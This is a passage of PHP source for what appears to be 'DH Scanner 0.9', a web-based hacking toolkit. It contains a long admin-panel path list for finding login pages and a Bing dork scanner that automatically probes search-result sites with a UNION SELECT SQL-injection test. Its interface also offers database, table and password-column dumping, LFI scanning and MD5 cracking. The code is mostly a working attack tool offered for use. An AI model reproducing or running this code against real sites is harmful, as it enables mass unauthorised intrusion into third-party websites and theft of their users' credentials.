        'Server/',
        'wp-admin/',
        'administr8.php',
        'administr8.html',
        'administr8/',
        'administr8.asp',
        'webadmin/',
        'webadmin.php',
        'webadmin.asp',
        'webadmin.html',
        'administratie/',
        'admins/',
        'admins.php',
        'admins.asp',
        'admins.html',
        'administrivia/',
        'Database_Administration/',
        'WebAdmin/',
        'useradmin/',
        'sysadmins/',
        'admin1/',
        'system-administration/',
        'administrators/',
        'pgadmin/',
        'directadmin/',
        'staradmin/',
        'ServerAdministrator/',
        'SysAdmin/',
        'administer/',
        'LiveUser_Admin/',
        'sys-admin/',
        'typo3/',
        'panel/',
        'cpanel/',
        'cPanel/',
        'cpanel_file/',
        'platz_login/',
        'rcLogin/',
        'blogindex/',
        'formslogin/',
        'autologin/',
        'support_login/',
        'meta_login/',
        'manuallogin/',
        'simpleLogin/',
        'loginflat/',
        'utility_login/',
        'showlogin/',
        'memlogin/',
        'members/',
        'login-redirect/',
        'sub-login/',
        'wp-login/',
        'login1/',
        'dir-login/',
        'login_db/',
        'xlogin/',
        'smblogin/',
        'customer_login/',
        'UserLogin/',
        'login-us/',
        'acct_login/',
        'admin_area/',
        'bigadmin/',
        'project-admins/',
        'phppgadmin/',
        'pureadmin/',
        'sql-admin/',
        'radmind/',
        'openvpnadmin/',
        'wizmysqladmin/',
        'vadmind/',
        'ezsqliteadmin/',
        'hpwebjetadmin/',
        'newsadmin/',
        'adminpro/',
        'Lotus_Domino_Admin/',
        'bbadmin/',
        'vmailadmin/',
        'Indy_admin/',
        'ccp14admin/',
        'irc-macadmin/',
        'banneradmin/',
        'sshadmin/',
        'phpldapadmin/',
        'macadmin/',
        'administratoraccounts/',
        'admin4_account/',
        'admin4_colon/',
        'radmind-1/',
        'Super-Admin/',
        'AdminTools/',
        'cmsadmin/',
        'SysAdmin2/',
        'globes_admin/',
        'cadmins/',
        'phpSQLiteAdmin/',
        'navSiteAdmin/',
        'server_admin_small/',
        'logo_sysadmin/',
        'server/',
        'database_administration/',
        'power_user/',
        'system_administration/',
        'ss_vms_admin_sm/'
    );
    @set_time_limit(20);
    
    $resultado = "";
    
    $resultado = $resultado . "[+] Searching panels in " . htmlentities($target) . "\n";
    foreach ($panels as $panel) {
        if (tomax($target . "/" . $panel) == 200) {
            $resultado = $resultado . "\n[+] Link : " . htmlentities($target) . "/" . htmlentities($panel);
        }
    }
    $resultado = $resultado . "\n\n" . "[+] Finished";
    
    return $resultado;
}

function scanner_bing($dork, $paginas)
{
    
    $resultado = "";
    
    $resultado = $resultado . "[+] Scanning ...\n";
    $valor     = "10" * $paginas;
    $valorz    = (int) $valor;
    for ($i = 10; $i <= $valorz; $i += 10) {
        $code = toma("http://www.bing.com/search?q=" . $dork . "&first=" . $i);
        
        if (preg_match('/<h3><a href="(.*?)"/i', $code)) {
            preg_match_all('/<h3><a href="(.*?)"/i', $code, $re);
            $reco = $re[1];
            foreach ($reco as $target) {
                if (!preg_match('/778802\.r\.msn\.com/i', $target)) {
                    if (preg_match('/(.*)=(.*)/i', $target)) {
                        preg_match_all('/(.*)=(.*)/i', $target, $re);
                        $code = toma($re[1][0] . "=-1+union+select+1--");
                        if (preg_match('/The used SELECT statements have a different number of columns/i', $code)) {
                            $resultado = $resultado . "\n[+] SQLI : " . htmlentities($re[1][0]) . "= OK";
                        } else {
                            $resultado = $resultado . "\n[-] SQLI : " . htmlentities($re[1][0]) . "= FAIL";
                        }
                    }
                }
            }
        }
        if (preg_match('/<h2><a href="(.*?)"/i', $code)) {
            preg_match_all('/<h2><a href="(.*?)"/i', $code, $re);
            $reco = $re[1];
            foreach ($reco as $target) {
                if (!preg_match('/778802\.r\.msn\.com/i', $target)) {
                    if (preg_match('/(.*)=(.*)/i', $target)) {
                        preg_match_all('/(.*)=(.*)/i', $target, $re);
                        $code = toma($re[1][0] . "=-1+union+select+1--");
                        if (preg_match('/The used SELECT statements have a different number of columns/i', $code)) {
                            $resultado = $resultado . "\n[+] SQLI : " . htmlentities($re[1][0]) . "= OK";
                        } else {
                            $resultado = $resultado . "\n[-] SQLI : " . htmlentities($re[1][0]) . "= FAIL";
                        }
                    }
                }
            }
        }
    }
    $resultado = $resultado . "\n\n[+] Finished\n";
    return $resultado;
}
function hexdecode($texto)
{
    // Credits
    // Based on : http://stackoverflow.com/questions/14674834/php-convert-string-to-hex-and-hex-to-string
    $final = "";
    for ($num = 0; $num < strlen($texto) - 1; $num += 2) {
        $final .= chr(hexdec($texto[$num] . $texto[$num + 1]));
    }
    return $final;
}
function hex($texto)
{
    // Credits
    // Based on : http://stackoverflow.com/questions/14674834/php-convert-string-to-hex-and-hex-to-string
    $final = "";
    for ($num = 0; $num < strlen($texto); $num++) {
        $final .= substr('0' . dechex(ord($texto[$num])), -2);
    }
    return "0x" . $final;
}
function tomax($target)
{
    $nave = curl_init($target);
    curl_setopt($nave, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0');
    curl_setopt($nave, CURLOPT_TIMEOUT, 10);
    curl_setopt($nave, CURLOPT_RETURNTRANSFER, true);
    $resultado = curl_exec($nave);
    return curl_getinfo($nave, CURLINFO_HTTP_CODE);
}
function toma($target)
{
    $nave = curl_init($target);
    curl_setopt($nave, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0');
    curl_setopt($nave, CURLOPT_TIMEOUT, 10);
    curl_setopt($nave, CURLOPT_RETURNTRANSFER, true);
    return curl_exec($nave);
}
function tomar($target, $params)
{
    $nave = curl_init($target);
    curl_setopt($nave, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0');
    curl_setopt($nave, CURLOPT_TIMEOUT, 10);
    curl_setopt($nave, CURLOPT_POST, true);
    curl_setopt($nave, CURLOPT_POSTFIELDS, $params);
    curl_setopt($nave, CURLOPT_RETURNTRANSFER, true);
    return curl_exec($nave);
}

// 

if (isset($_COOKIE['login'])) {
    
    $st = base64_decode($_COOKIE['login']);
    
    $plit = explode("@", $st);
    $user = $plit[0];
    $pass = $plit[1];
    
    if ($user == $username and $pass == $password) {
        
        echo '
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
      <title>DH Scanner 0.9</title>
      <link href="style.css" rel="stylesheet" type="text/css" />
      <link rel="shortcut icon" href="images/icono.png">
   </head>
   <body>
   <center>
   ';
        
        echo '         <br><a href=' . 'http://' . htmlentities($_SERVER['HTTP_HOST']) . htmlentities($_SERVER['PHP_SELF']) . ' style:"border-style: none;"><img src="images/scanner.png" /></a><br>';
        
        
        if (isset($_GET['bing'])) {
            if (isset($_POST['bingscan'])) {
                
                echo '<div class="post">
                <h3>' . '<a href=http://' . htmlentities($_SERVER['HTTP_HOST']) . htmlentities($_SERVER['PHP_SELF']) . '?bing>Console</a>' . '</h3>
                   <div class="post_body"><br>';
                
                echo "
<textarea cols=70 rows=40 name=code readonly>\n\n";
                echo htmlentities(scanner_bing($_POST['dork'], $_POST['pages']));
                echo "\n</textarea><br><br>";
                
                echo '                </div>
            </div>';
                
            } else {
                
                echo '
            <div class="post">
                <h3>Bing Scanner</h3>
                   <div class="post_body"><br>';
                
                echo "
<form action=?bing method=POST>
<b>Enter Dork : </b><input type=text size=50 name=dork value=news.php+id><br><br>
<b>Enter Pages : </b><input type=text size=50 name=pages value=2><br><br>
<input type=submit name=bingscan style='height: 25px; width: 200px' value=Scan><br><br>
</form>
";
                
                echo '                </div>
            </div>';
                
            }
        } elseif (isset($_GET['sql'])) {
            if (isset($_POST['scansql'])) {
                
                echo '<div class="post">
                <h3>' . '<a href=http://' . htmlentities($_SERVER['HTTP_HOST']) . htmlentities($_SERVER['PHP_SELF']) . '?sql>Console</a>' . '</h3>
                   <div class="post_body"><br>';
                
                echo "
<textarea cols=70 rows=40 name=code readonly>\n\n";
                echo htmlentities(sqlscan($_POST['target']));
                echo "\n</textarea><br><br>";
                
                echo '                </div>
            </div>';
                
            } elseif (isset($_POST['getables'])) {
                
                echo '<div class="post">
                <h3>' . '<a href=http://' . htmlentities($_SERVER['HTTP_HOST']) . htmlentities($_SERVER['PHP_SELF']) . '?sql>Console</a>' . '</h3>
                   <div class="post_body"><br>';
                
                echo "
<textarea cols=70 rows=40 name=code readonly>\n\n";
                echo htmlentities(sql_tables($_POST['target']));
                echo "\n</textarea><br><br>";
                
                echo '                </div>
            </div>';
                
            } elseif (isset($_POST['getdbs'])) {
                
                echo '<div class="post">
                <h3>' . '<a href=http://' . htmlentities($_SERVER['HTTP_HOST']) . htmlentities($_SERVER['PHP_SELF']) . '?sql>Console</a>' . '</h3>
                   <div class="post_body"><br>';
                
                echo "
<textarea cols=70 rows=40 name=code readonly>\n\n";
                echo htmlentities(sql_dbs($_POST['target']));
                echo "\n</textarea><br><br>";
                
                echo '                </div>
            </div>';
                
            } elseif (isset($_POST['getmysql'])) {
                
                echo '<div class="post">
                <h3>' . '<a href=http://' . htmlentities($_SERVER['HTTP_HOST']) . htmlentities($_SERVER['PHP_SELF']) . '?sql>Console</a>' . '</h3>
                   <div class="post_body"><br>';
                
                echo "
<textarea cols=70 rows=40 name=code readonly>\n\n";
                echo htmlentities(sql_mysql($_POST['target']));
                echo "\n</textarea><br><br>";
                
                echo '                </div>
            </div>';
                
            } elseif (isset($_POST['scancolumns'])) {
                
                echo '<div class="post">
                <h3>' . '<a href=http://' . htmlentities($_SERVER['HTTP_HOST']) . htmlentities($_SERVER['PHP_SELF']) . '?sql>Console</a>' . '</h3>
                   <div class="post_body"><br>';
                
                echo "
<textarea cols=70 rows=40 name=code readonly>\n\n";
                echo htmlentities(sql_columns($_POST['target'], $_POST['tablesimple']));
                echo "\n</textarea><br><br>";
                
                echo '                </div>
            </div>';
                
            } elseif (isset($_POST['scantablesdb'])) {
                
                echo '<div class="post">
                <h3>' . '<a href=http://' . htmlentities($_SERVER['HTTP_HOST']) . htmlentities($_SERVER['PHP_SELF']) . '?sql>Console</a>' . '</h3>
                   <div class="post_body"><br>';
                
                echo "
<textarea cols=70 rows=40 name=code readonly>\n\n";
                echo htmlentities(sql_db_tables($_POST['target'], $_POST['db']));
                echo "\n</textarea><br><br>";
                
                echo '                </div>
            </div>';
                
            } elseif (isset($_POST['scancolumnsdb'])) {
                
                echo '<div class="post">
                <h3>' . '<a href=http://' . htmlentities($_SERVER['HTTP_HOST']) . htmlentities($_SERVER['PHP_SELF']) . '?sql>Console</a>' . '</h3>
                   <div class="post_body"><br>';
                
                echo "
<textarea cols=70 rows=40 name=code readonly>\n\n";
                echo htmlentities(sql_db_columns($_POST['target'], $_POST['dbname'], $_POST['tabledb']));
                echo "\n</textarea><br><br>";
                
                echo '                </div>
            </div>';
                
            } elseif (isset($_POST['dumpernow'])) {
                
                echo '<div class="post">
                <h3>' . '<a href=http://' . htmlentities($_SERVER['HTTP_HOST']) . htmlentities($_SERVER['PHP_SELF']) . '?sql>Console</a>' . '</h3>
                   <div class="post_body"><br>';
                
                echo "
<textarea cols=70 rows=40 name=code readonly>\n\n";
                echo htmlentities(sql_dumper($_POST['target'], $_POST['dumptable'], $_POST['dumpcol1'], $_POST['dumpcol2']));
                echo "\n</textarea><br><br>";
                
                echo '                </div>
            </div>';
                
            } else {
                
                echo "<form action=?sql method=POST>";
                
                echo '
            <div class="post">
                <h3>SQLI Scanner</h3>
                   <div class="post_body"><br>';
                
                echo "
<b>Target : </b><input type=text size=40 name=target value=http://localhost/labs/sql.php?id=>
<input type=submit name=scansql style='width: 200px' value='Scan'><br><br><input type=submit name=getables style='width: 150px' value='Get Tables'> <input type=submit name=getdbs style='width: 150px' value='Get Databases'> <input type=submit name=getmysql style='width: 150px' value='Get mysql.users'><br><br>";
                
                echo '                </div>
            </div>';
                
                
                echo '
            <div class="post">
                <h3>Get Columns</h3>
                   <div class="post_body"><br>';
                
                echo "
<b>Table : </b><input type=text size=20 name=tablesimple value=hackers>
<input type=submit name=scancolumns style='width: 200px' value='Extract'><br><br>";
                
                echo '                </div>
            </div>';
                
                
                echo '
            <div class="post">
                <h3>Get Tables of DB</h3>
                   <div class="post_body"><br>';
                
                echo "
<b>DB : </b><input type=text size=20 name=db value=hackman>
<input type=submit name=scantablesdb style='width: 200px' value='Extract'><br><br>";
                
                echo '                </div>
            </div>';
                
                
                echo '
            <div class="post">
                <h3>Get Columns of DB & Table</h3>
                   <div class="post_body"><br>';
                
                echo "
<b>DB : </b><input type=text size=20 name=dbname value=hackman><br><br>
<b>Table : </b><input type=text size=20 name=tabledb value=hackers><br><br>
<input type=submit name=scancolumnsdb style='width: 200px' value='Extract'><br><br>";
                
                echo '                </div>
            </div>';
                
                echo '
            <div class="post">
                <h3>Dumper</h3>
                   <div class="post_body"><br>';
                
                echo "
<b>Table : </b><input type=text size=42 name=dumptable value=hackers><br><br>
<b>Column 1 : </b><input type=text size=37 name=dumpcol1 value=usuario><br><br>
<b>Column 2 : </b><input type=text size=37 name=dumpcol2 value=password><br><br>
<input type=submit name=dumpernow style='width: 200px' value='Dump'><br><br>";
                
                echo '                </div>
            </div>';
                
                echo "</form>";
                
            }
        } elseif (isset($_GET['crack'])) {
            if (isset($_POST['crackscan'])) {
                
                echo '<div class="post">
                <h3>' . '<a href=http://' . htmlentities($_SERVER['HTTP_HOST']) . htmlentities($_SERVER['PHP_SELF']) . '?crack>Console</a>' . '</h3>
                   <div class="post_body"><br>';
                
                echo "
<textarea cols=70 rows=40 name=code readonly>\n\n";
                $hashes = trim($_POST['hashes']);
                $hashes = explode("\n", $hashes);
                echo "[+] Cracking hashes ...\n";
                foreach ($hashes as $hash) {
                    echo htmlentities(crackmd5(trim($hash)));
                }
                echo "\n\n[+] Finished";
                echo "\n</textarea><br><br>";
                
                echo '                </div>
            </div>';
                
            } else {
                
                echo '
            <div class="post">
                <h3>MD5 Cracker</h3>
                   <div class="post_body"><br>';
                
                echo "
<form action=?crack method=POST>
<b>Enter Hashes</b><br><br>
<textarea cols=50 rows=20 name=hashes>
</textarea><br><br>
<input type=submit size=500 name=crackscan style='height: 25px; width: 200px' value=Crack><br><br>
</form>";
                
                echo '                </div>
            </div>';
                
            }
        } elseif (isset($_GET['admin'])) {
            if (isset($_POST['adminscan'])) {
                echo '<div class="post">
                <h3>' . '<a href=http://' . htmlentities($_SERVER['HTTP_HOST']) . htmlentities($_SERVER['PHP_SELF']) . '?admin>Console</a>' . '</h3>
                   <div class="post_body"><br>';
                
                echo "
<textarea cols=70 rows=40 name=code readonly>\n\n";
                echo htmlentities(paneladmin($_POST['target']));
                echo "\n</textarea><br><br>";
                
                echo '                </div>
            </div>';
                
                
            } else {
                
                echo '
            <div class="post">
                <h3>Admin Finder</h3>
                   <div class="post_body"><br>';
                
                echo "
<form action=?admin method=POST>
<b>Enter Page : </b><input type=text size=50 name=target value=http://localhost/><br><br>
<input type=submit size=500 name=adminscan style='height: 25px; width: 200px' value=Scan><br><br>
</form>
";
                
                echo '                </div>
            </div>';
                
            }
        } elseif (isset($_GET['lfi'])) {
            if (isset($_POST['lfiscan'])) {
                
                echo '<div class="post">
                <h3>' . '<a href=http://' . htmlentities($_SERVER['HTTP_HOST']) . htmlentities($_SERVER['PHP_SELF']) . '?lfi>Console</a>' . '</h3>
                   <div class="post_body"><br>';
                
                echo "
<textarea cols=70 rows=40 name=code readonly>\n\n";
                echo htmlentities(lfiscan($_POST['target']));
                echo "\n</textarea><br><br>";
                
                echo '                </div>
            </div>';
                
            } else {
                
                echo '
            <div class="post">
                <h3>LFI Scan</h3>
                   <div class="post_body"><br>';
                
                echo "
<form action=?lfi method=POST>
<br><center><b>Enter Page : </b><input type=text size=50 name=target value=http://localhost/labs/lfi.php?file=><br><br>
<input type=submit size=500 name=lfiscan style='height: 25px; width: 200px' value=Scan><br><br>
</form>
";
                
                echo '                </div>
            </div>';
                
            }
        } elseif (isset($_GET['locate'])) {
            if (isset($_POST['locatescan'])) {
                
                echo '<div class="post">
                <h3>' . '<a href=http://' . htmlentities($_SERVER['HTTP_HOST']) . htmlentities($_SERVER['PHP_SELF']) . '?locate>Console</a>' . '</h3>
                   <div class="post_body"><br>';
                
                echo "
<textarea cols=70 rows=40 name=code readonly>\n\n";
                echo htmlentities(locateip($_POST['target']));
                echo "\n</textarea><br><br>";
                
                echo '                </div>
            </div>';
                
            } else {
                
                echo '
            <div class="post">
                <h3>Locate IP</h3>
                   <div class="post_body"><br>';
                
                echo "
<form action=?locate method=POST>
<b>Enter Page : </b><input type=text size=50 name=target value=http://www.petardas.com/index.php><br><br>
<input type=submit size=500 name=locatescan style='height: 25px; width: 200px' value=Scan><br><br>
</form>
";
                
                echo '                </div>
            </div>';
                
            }
        } elseif (isset($_GET['encode'])) {
            if (isset($_POST['encodescan'])) {
                
                echo '<div class="post">
                <h3>' . '<a href=http://' . htmlentities($_SERVER['HTTP_HOST']) . htmlentities($_SERVER['PHP_SELF']) . '?encode>Console</a>' . '</h3>
                   <div class="post_body"><br>';
                
                echo "
<textarea cols=70 rows=40 name=code readonly>\n\n";
                if ($_POST['optionsa'] == "MD5") {
                    echo "[+] MD5 : " . md5($_POST['tex']);
                }
                if ($_POST['optionsa'] == "Base64") {
                    echo "[+] Base64 Encode : " . base64_encode($_POST['tex']);
                }
                if ($_POST['optionsa'] == "Hex") {
                    echo "[+] Hex Encode : " . hex($_POST['tex']);
                }
                echo "\n</textarea>";
                
                echo '                <br><br></div>
            </div>';
                
                
            } elseif (isset($_POST['decodescan'])) {
                
                echo '<div class="post">
                <h3>' . '<a href=http://' . htmlentities($_SERVER['HTTP_HOST']) . htmlentities($_SERVER['PHP_SELF']) . '?encode>Console</a>' . '</h3>
                   <div class="post_body"><br>';
                
                echo "
<textarea cols=70 rows=40 name=code readonly>\n\n";
                if ($_POST['optionsa'] == "MD5") {
                    echo "[+] MD5 : ?";
                }
                if ($_POST['optionsa'] == "Base64") {
                    echo "[+] Base64 Decode : " . base64_decode($_POST['tex']);
                }
                if ($_POST['optionsa'] == "Hex") {
                    echo "[+] Hex Decode : " . hexdecode($_POST['tex']);
                }
                echo "\n</textarea>";
                
                echo '                <br><br></div>
            </div>';
                
            } else {
                
                echo '
            <div class="post">
                <h3>Encoders</h3>
                   <div class="post_body"><br>';
                
                echo "<form action=?encode method=POST>
<b>Text :</b> <input type=text name=tex value=test> <b>Options : </b><select name=optionsa><option>MD5</option><option>Base64</option><option>Hex</option></select> <input type=submit name=encodescan value=Encode> <input type=submit name=decodescan value=Decode>
</form><br>
";
                
                echo '                </div>
            </div>';
                
            }
        } else {
            
            echo '
            <div class="post">
                <h3>Menu</h3>
                   <div class="post_body"><br>';
            
            echo "<table>
<td width=300><h4><center><b>Options</b></center></h4></td><tr>
<td width=300><h4><center><a href=?bing>Bing Scanner</a></center></h4></td><tr>
<td width=300><h4><center><a href=?sql>SQLI Scanner</a></center></h4></td><tr>
<td width=300><h4><center><a href=?lfi>LFI Scanner</a></center></h4></td><tr>
<td width=300><h4><center><a href=?crack>MD5 Cracker</a></center></h4></td><tr>
<td width=300><h4><center><a href=?admin>Admin Finder</a></center></h4></td><tr>
<td width=300><h4><center><a href=?locate>Locate IP</a></center></h4></td><tr>
<td width=300><h4><center><a href=?encode>Encoders</a></center></h4></td><tr>
</table><br>";
            
            echo '                </div>
            </div>';
            
        }
        
        echo '  
   </center> 
   <br><h3>(C) Doddy Hackman 2015</h3><br>
   </body>
</html>';
        
    } else {
        echo "<script>alert('Fuck You');</script>";
    }
} else {
    echo '<meta http-equiv="refresh" content="0; url=http://www.petardas.com" />';
}

// The End ?

?>